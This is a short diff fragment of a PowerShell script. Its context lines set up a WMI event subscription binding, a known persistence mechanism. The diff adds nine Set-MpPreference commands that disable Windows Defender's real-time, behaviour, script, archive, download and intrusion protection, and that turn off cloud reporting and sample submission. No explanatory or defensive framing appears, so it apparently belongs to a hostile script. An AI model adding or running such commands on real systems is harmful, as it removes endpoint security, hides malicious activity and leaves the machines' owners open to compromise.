@@ -80,3 +80,13 @@ $bindArgs = @{
     Consumer = [string]$SafeConsumer.__RELPATH;
 }
 Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -SubmitSamplesConsent 2
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScriptScanning $true
